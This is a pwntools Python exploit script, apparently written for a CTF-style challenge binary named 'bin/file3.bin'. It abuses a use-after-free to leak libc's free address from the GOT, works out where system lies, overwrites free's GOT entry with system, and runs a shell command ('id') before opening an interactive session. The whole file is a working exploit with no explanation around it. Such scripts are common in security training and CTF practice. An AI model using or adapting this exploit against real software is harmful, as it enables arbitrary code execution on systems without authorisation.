#!/bin/env python3
from pwn import *

## Helpers

def create_obj(name, id):
    p.sendline("1")
    p.sendline(name)
    p.sendline(id)

def delete_name(index):
    p.sendline("3")
    p.sendline(str(index))
    p.sendline("2")

def change_name(index, new_name):
    p.sendline("4")
    p.sendline(str(index))
    p.sendline(new_name)

def change_id(index, id):
    p.sendline("5")
    p.sendline(str(index))
    p.sendline(id)

def delete_id(index):
    p.sendline("3")
    p.sendline(str(index))
    p.sendline("1")

def leak_name(index):
    p.clean()
    p.sendline("2")
    p.recvuntil("%d]\t-> nom : " % index, drop=True)
    return u64(p.read(6).ljust(8, b'\x00'))


###################################################################


BINARY_NAME = 'bin/file3.bin'
LIBC_PATH = '/usr/lib/libc.so.6'
CMD = "id"

## Setup some vars
bin_elf = ELF(BINARY_NAME)
libc_elf = ELF(LIBC_PATH)
free_got = p64(bin_elf.got[b'free'])
offset = libc_elf.symbols[b'free'] - libc_elf.symbols[b'system']
p = process([BINARY_NAME])

create_obj("A"*16, "B"*16)
delete_name(0)
create_obj("C"*16, "D"*16)

# Now, objs[0]->name points to the second structure
# Let's leak free address by changing the address of objs[1]->name
change_name(0, free_got.rstrip(b'\x00'))

# Get leak (`free` address)
free_leak = leak_name(1)
system_address = free_leak - offset

print("Leak: " + hex(free_leak))
print("System address: " + hex(system_address))
print("Now, we are ready to pwn this binary")

# Replace `free` address by `system`
change_name(1, p64(system_address).rstrip(b'\x00'))

# Set our command inside `id` field
change_id(1, CMD)

# Now just call `free` (`system`) for the id field
p.clean()
delete_id(1)

p.interactive()
